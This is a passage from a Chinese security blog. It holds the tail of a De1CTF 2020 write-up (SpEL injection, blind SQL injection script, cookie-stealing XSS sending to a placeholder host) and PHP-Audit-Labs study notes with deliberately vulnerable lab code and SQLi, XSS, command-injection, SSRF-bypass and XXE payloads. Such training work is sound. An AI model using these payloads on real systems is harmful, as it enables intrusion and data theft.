class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(<span class="keyword">null</span>),<span class="string">'curl 172.17.0.1:9898'</span>)</span><br></pre></td></tr></table></figure><p>然而payload打了一发发现报错。然后就无语了。这时想起来,抓包时发现header里有openrasp,估计是直接从底层把runtime之类的给hook掉了。</p><p>然后郁师傅说不用执行命令也能读。仔细想挺有道理的,不然没必要直接告诉我们flag在根目录<br>但是确实java太菜了…下面是队友教我的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New java.io.BufferedReader(New java.io.FileReader(<span class="string">"/flag"</span>)).readLine()</span><br></pre></td></tr></table></figure><p>原来在spEL里是不区分关键字大小写的…那直接用java能读文件的类来就行了…<br><a href="https://juejin.im/post/5cdc21626fb9a0320c5ad583" target="_blank" rel="noopener">Java 读文件的5种方式</a><br>同理也可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New java.util.Scanner(New java.io.File(<span class="string">"/flag"</span>)).nextLine()</span><br></pre></td></tr></table></figure><p><img src="/2020/05/04/De1CTF2020writeup/4.PNG" alt></p><p>java是真的要好好研究下了</p><p>ps:在推送里看到一篇文章恰好提到了De1这题。才发现dalao直接bypass openrasp进行RCE了…<br>参考:<a href="https://landgrey.me/blog/15/" target="_blank" rel="noopener">bypass openrasp SpEL RCE 的过程及思考</a><br>原来深挖spEL的底层解析源码，可发现空字符能直接bypass.所以，又可以产生完全不依赖new的实例化方法.直接空字符插进被过滤的<code>T(</code>中即可<br><img src="/2020/05/04/De1CTF2020writeup/5.PNG" alt></p><p>甚至进一步，还能通过反序列化的思想,不显示的加载恶意类,达成RCE。<br>orz原来java的姿势这么多的么…</p><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><p>可以任意登录<br>member.php注释中有 orderby<br>测了下发现应该是order by 后的语句<br>开始以为只能接limit<br>那有且仅有<code>procedure analyse</code>一种方法<br>但报错函数都没了。延时延不了。版本问题只能用5.6以下的函数。真心没手段了<br>我有罪，这种难度的sql被卡住。该打。</p><p>直接and 分流我居然会忘了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://134.175.185.244/member.php?orderby='</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890,"</span>:</span><br><span class="line">        payload = <span class="string">"and case when (substr((select password from member),"</span>+str(i)+<span class="string">",1)='"</span>+str1+<span class="string">"') then (benchmark(500000,sha(1))) else 1 end"</span></span><br><span class="line">        payload = urllib.parse.quote(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag+=str1</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>求得密码解出来得到<br>goodlucktoyou</p><p>进去后一开始发现有一个select.php任意读文件的功能与admin.php给出的phpinfo,但是读完源码后发现居然使用了Minclude这个函数来包含。phpinfo里也能看到这个函数的so文件….所以这题真面目是<del>WEB</del>-PWN,应该是通过调这个so来溢出执行根目录的readflag…</p><p>然而比赛已经快结束了，等于白给。</p><h2 id="AnimalCrossing"><a href="#AnimalCrossing" class="headerlink" title="AnimalCrossing"></a>AnimalCrossing</h2><p>这题等wp吧…老实说不想复现了。因为题目得到flag除了要弹admin的cookie,还要从admin界面的图片获取信息…<br>没见过这么磨人的xss.</p><p>5.18复现:</p><p>今天整理仓库时偶然发现De1CTF这个题是有docker环境的。于是就起了个环境尝试复现下。发现学到了不少姿势。</p><p>首先第一步自然是利用那个可能达成xss的点了。本题是在这个url中的data位置<br><img src="/2020/05/04/De1CTF2020writeup/6.PNG" alt></p><p>但是此处self-xss的达成都十分困难。因为一方面存在waf过滤掉字符(这里如果parse失败回显也是按遇到waf判断的,所以要注意语法的规范)。同时还有个CSP.<br><code>default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</code><br>当然这个CSP很好绕。使用location这一类型的跳转就可以了。难点在于绕waf达成后面的js代码执行。</p><p>看到sky师傅的wp后才恍然大悟。(膜一叶飘零师傅,自己很多知识都是从他的文章那学来的).原来是可以利用js的一个trick,而且自己曾经大概接触过。</p><p>先解释下这里的xss执行<br><img src="/2020/05/04/De1CTF2020writeup/7.PNG" alt><br>我们的数据可以直接通过url中data参数拼接进这里的js代码。首先自然使用<code>1&#39;//</code>保证代码语法的合法性。之后考虑的就是,怎么样在单引号跟注释符中间这部分使用js代码绕过waf进行xss。<br>于是这里就要提到js的一个trick了。先解释下sky师傅的payload。<br><img src="/2020/05/04/De1CTF2020writeup/8.PNG" alt><br>对于js中一个对象而言,其<code>valueOf()</code>方法会返回对象本身。而当我们将对象与二元运算符进行操作时,将会调用valueof方法。<br>那么这样就简单了,只要能控制<code>valueOf()</code>方法返回值,就能执行任意js代码。<br>那么此处payload就可以构造成</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+&#123;"valueOf":new "".construcor.constructor(atob('</span>base64xsspayload<span class="string">'))&#125;+1//</span></span><br></pre></td></tr></table></figure><p>使用<code>constructor</code>获取到匿名函数这个在nodejs里已经非常熟悉了。同时这里<code>+1</code>就可以直接触发<code>valueOf</code>.最后我们为了绕过waf使用吧base64绕过。</p><p>当然使用其他方法都可以。我看见榜一的mslcpayload大概也是用二元运算符加上base64paylaod达成的。只不过用的是js伪协议。形式上简单了许多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;javascript:&#123;window.location.href&#x3D;&quot;vpsip&#x2F;?&quot;+document.cookie&#125;</span><br><span class="line"></span><br><span class="line">data&#x3D;1&#39;%2bopen(atob(&#39;base64encodepaylaod&#39;))&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>后面打给admin收flag<br>因为docker环境不知道为什么内网服务没起来,所以没法继续复现了。后面大致的内容就是发现admin的页面有照片,所以可以一个个下下来拼图即可。(用到了之前的pngbypassCSP的内容)</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次比赛还是几乎全程自闭。虽然大家应该都差不多吧。而且没想到的是自己居然是WEB主C,估计以后也会这样承担起比以往更大的责任了.学长们没打，就只能靠自己。可能一直以来心里觉得有郁离歌在,这些题目都不是事的.然而这次De1直接泼了一头冷水，提醒我最后还是得靠自己。硬实力才是王道。</p><p>马上网鼎也来了，这段时间争取把java安全能入个门，php代审过完吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-Audit-Labs审计学习</title>
      <link href="2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>打算在代码审计上入下坑。本来找了个不知名cms想审计一下的。偶然间看到了星盟王叹之师傅在用php-audit-labs练审计,所以自己也打算练一下审计的技术,毕竟自己审计功力太差了…p牛也曾经说过,练习审计到能看懂一个完整的CMS就算有一定功底了。所以就把php-audit-labs的全部都过一遍吧。</p><p>(最近也总算熟练了一下node跟python相关的开发入门。等之后找时间把java入门知识过一遍,再把ECMAscript6的基础过一遍就差不多了）</p><a id="more"></a><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/1.png" alt><br>任意文件上传漏洞。主要问题在于<code>in_array()</code>函数的使用不当。如果未设置<code>in_array()</code>第三个参数为true则我们可以通过上传<code>7shell.php</code>绕过检查。因为<code>7shell.php</code>被转换为7.<br>同样出现在某cms中利用这点可以绕过进行insert_into注入<br><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/2.png" alt><br>当in_array()绕过后轻松达成注入。<br><code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code></p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"day1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $pattern = <span class="string">"insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval"</span>;</span><br><span class="line">    $back_list = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">    <span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/$hack/i"</span>, $value))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"$hack detected!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$whitelist = <span class="keyword">array</span>();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist = range(<span class="number">1</span>, $row[<span class="string">'COUNT(*)'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE id=$id"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"id $id is not in whitelist."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题的<code>in_array()</code>并不是难点。因为只要id开头为数字就能绕过了<br>主要问题在于后面注入上。<br>所幸语句中会爆出sqlerror.在过滤了这些关键字的情况下仍可以使用报错函数,select,from等基本就足够得到flag了。<br>不过这里存在一个细节,就是updatexml这样的报错函数如果语句中不包含特殊字符也就是我们原来经常使用的0x7e之类的字符，爆出的结果将会出现字符丢失的现象。</p><p>所以找替代的字符串连接函数即可.<code>make_set()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1))</span><br></pre></td></tr></table></figure><p>其实自己原来做sql注入的题目也曾搜索过相关的内容。比如在concat被过滤的情况下不使用<code>group_concat</code>将所有查询结果都列出来。当时发现<code>make_set()</code>是能起到concat一样的效果的。但是注意的是,<code>make_set</code>至少接收两个参数,因此必须使用逗号。<code>concat</code>类则不然。</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/3.png" alt></p><p>题目主要是在两处存在过滤。首先是twig模板里出现的link被escape了</p><p>然后是一个filter_var()函数<br>这里escape过滤器调用的实际上是<code>htmlspecialchars()</code>函数。作用自然是将常见的特殊字符转为实体字符。<br>而<code>filter_var()</code>在curl的ssrf中就曾见过。主要检查一个url是否合法。<br>因此代码逻辑主要是经过过滤后生成一个a标签。<br>那么可能存在self-xss</p><p>官方的payload<br><code>?nextSlide=javascript://comment％250aalert(1)</code>达到弹窗的self-xss. 使用javascript伪协议绕过<br>巧妙的就是利用filtervar的缺陷轻松使用xxx://的形式绕过检查。然后也可以进行js语句的执行。重要的一点就是//在js中是注释符。因此使用%250a(double urlencode %0a 以绕过浏览器自动的解码)将后面的内容换行到下一行。成功执行alert.</p><p>某cms中的利用是,在访问404页面存在这样的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span>&lt;/code&gt;</span><br></pre></td></tr></table></figure><p>current_url()方法接受完整的404url参数。返回最后一个/后的内容拼接进code代码块。即可以插入xss代码<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>导致了xss<br>payload<code>http://localhost/anchor/index.php/&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$flag = <span class="string">"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个明显的curl。而且还是经典的可绕过的<code>filter_var()</code>+<code>parse_url()</code>+<code>exec()</code>执行curl的配置。<br>那现在关键是利用这个来进行文件读取。<br>比如把之前的可绕过<code>filter_var()</code>+<code>parse_url()</code>的payload拿出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">demo:&#x2F;&#x2F;evil.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">demo:&#x2F;&#x2F;evil.com:80,sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure><p>这里想要执行命令读取文件。那么恰好可以用到linux中使用分号进行命令分割的作用。<br><code>demo://%22;ls;%23;sec-redclub.com:80/</code><br>然后为了读文件使用<code>&lt;</code>代替空格<br><code>demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</code></p><p>单纯针对filter_var的话把七月火师傅的payload放出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.com</span><br><span class="line">PS:最后一个payload的#符号，请换成对应的url编码 %23</span><br></pre></td></tr></table></figure><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="class-exists-amp-amp-内部类xxe"><a href="#class-exists-amp-amp-内部类xxe" class="headerlink" title="class_exists()&amp;&amp;内部类xxe"></a>class_exists()&amp;&amp;内部类xxe</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/4.png" alt></p><p>上面的代码有一个比较过时的路径穿越的文件包含的洞。<br>即调用<code>class_exists()</code>函数时会自动加载__autoload()。达成文件包含。如果是ph5-5.3则可以构造路径穿越。<br>还有一个洞比较有意思。实例化类的类名和传入类的参数均可控。此时即使没有恶意类我们也能用SimpleXMLElement构造xxe攻击。这点我在buu上做<br>SUCTF 2018 Homework这题时也用到了它达成xxe并进一步使用xxe打ssrf</p><p>某cms的利用是一个可控变量带来的反序列化XXE.具体利用不谈。简单说下gadget最后的利用。类中实现了一个反射类实例化。而类名可控。之后连反射类的参数也是可控的。导致我们可以任意实例化SimpleXMLElement并构造xxepayload进行攻击。<br>根据实际情况构造payload<br><code>{&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:{&quot;direction&quot;:&quot;asc&quot;}}</code><br>这里几个参数尤其是2那个印象很深刻,同时也很必要。SUCTF那题就是如此<br><code>{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}}</code></p><h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'404'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($class)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? $_GET[<span class="string">'name'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param = <span class="keyword">isset</span>($_GET[<span class="string">'param'</span>]) ? $_GET[<span class="string">'param'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param2 = <span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]) ? $_GET[<span class="string">'param2'</span>] : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">    $newclass = <span class="keyword">new</span> $classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    <span class="keyword">foreach</span> ($newclass <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">        <span class="keyword">echo</span> $key.<span class="string">'=&gt;'</span>.$value.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用经过上面的铺垫就很简单了。直接用可控的参数进行xxe即可。但是需要注意的是,xxe需要进行php文件流来进行内容读取。因为<code>&lt; &gt; &amp; &#39; &quot;</code>等字符会使xml解析出错。不过用base64读文件这种解决办法想必早就是轻车熟路了吧。<br><code>?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</code></p><p>假如题目不知道flag的名字还可以用另外的类进行文件名的读取。<br><code>?name=GlobIterator&amp;param=./*.php&amp;param2=0</code><br>作用与glob差不多。</p><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="str-pos-错误使用"><a href="#str-pos-错误使用" class="headerlink" title="str_pos()错误使用"></a>str_pos()错误使用</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/5.png" alt></p><p>php许多函数因为弱类型或黑魔法诞生了各种各样的漏洞。str_pos()也是如此。上面的代码看似严格限制了内容不能含有<code>&lt;</code>与<code>&gt;</code>。然而str_pos返回的值可以是0.<br>即匹配的字符串首个字符就是<code>&lt;</code>，<code>&gt;</code>。既然如此，<code>！strpos()</code>返回的就是真值。成功绕过。<br>payload:<br><code>&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</code><br>同样类似的漏洞也常见于preg_match()这样的函数。因为它可能会因为传入数组或者正则回溯导致返回false值。如果开发者所写的判断只是<code>!preg_match()</code>就很容易绕过了。</p><p>某CMS中的问题也是弱类型的锅。使用若类型相等判断时，假如数据库中存储的值是空字符串。那么当null与””进行弱类型相等时将返回true.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">null</span>==<span class="string">''</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0.0"</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0."</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0e"</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h3 id="练习-3"><a href="#练习-3" class="headerlink" 